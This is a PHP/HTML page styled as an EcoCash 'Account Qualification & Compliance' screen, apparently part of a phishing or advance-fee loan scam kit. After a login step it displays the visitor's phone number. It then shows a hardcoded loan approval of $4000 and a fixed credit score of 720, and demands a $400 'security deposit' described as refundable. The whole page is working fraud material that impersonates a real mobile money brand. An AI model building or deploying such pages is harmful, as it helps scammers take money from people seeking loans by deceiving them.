<?php
session_start();

if (!isset($_SESSION['phone'])) {
    header("Location: login.php");
    exit;
}

$phone = $_SESSION['phone'];
$lastLogin = date("Y-m-d H:i:s");
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>EcoCash | Qualification</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
    margin: 0;
    background: #f1f5f9;
    font-family: Arial, Helvetica, sans-serif;
}

.header {
    text-align: center;
    padding: 15px;
    font-size: 20px;
    font-weight: bold;
}

.header span:first-child { color: red; }
.header span:last-child { color: #2563eb; }

.card {
    max-width: 420px;
    margin: 20px auto;
    background: #fff;
    padding: 25px;
    border-radius: 18px;
    box-shadow: 0 8px 25px rgba(0,0,0,.08);
}

.title {
    font-size: 18px;
    font-weight: bold;
    margin-bottom: 15px;
}

.box {
    background: #f8fafc;
    padding: 14px;
    border-radius: 10px;
    margin-bottom: 12px;
    font-size: 14px;
}

.status {
    color: green;
    font-weight: bold;
}

.green {
    background: #46b36a;
    color: #fff;
    text-align: center;
    padding: 20px;
    border-radius: 14px;
    margin: 20px 0;
}

.score {
    text-align: center;
    font-size: 36px;
    color: #2563eb;
    font-weight: bold;
    margin: 15px 0;
}

.notice {
    background: #fff7e6;
    border-left: 4px solid orange;
    padding: 15px;
    font-size: 13px;
    border-radius: 10px;
}

.footer {
    text-align: right;
    font-size: 11px;
    color: #6b7280;
    margin-top: 10px;
}
</style>
</head>

<body>

<div class="header">
    <span>Eco</span><span>Cash</span>
</div>

<div class="card">

    <div class="title">Account Qualification & Compliance</div>

    <div class="box">
        <strong>DCCSA</strong><br>
        Phone Number<br>
        <?= htmlspecialchars($phone) ?>
    </div>

    <div class="box">
        Account Status<br>
        <span class="status">[Qualified]</span>
    </div>

    <div class="box">
        Status: Pending<br>
       
    </div>

    <div class="green">
        <h3>Congratulations!</h3>
        You are qualified for a loan of <b>$4000.00</b><br>
        10% bonus included.<br>
        Your credit score of 720 qualifies you for enhanced terms.
    </div>

    <div style="text-align:center;">Credit Score</div>
    <div class="score">720</div>

    <div class="notice">
        <b>Compliance Notice</b><br><br>
        Your EcoCash account must be active and maintain a security deposit of at least $400.00.
        This deposit is fully refundable upon successful repayment and helps you secure better
        interest rates.
    </div>

 

</div>

</body>
</html>
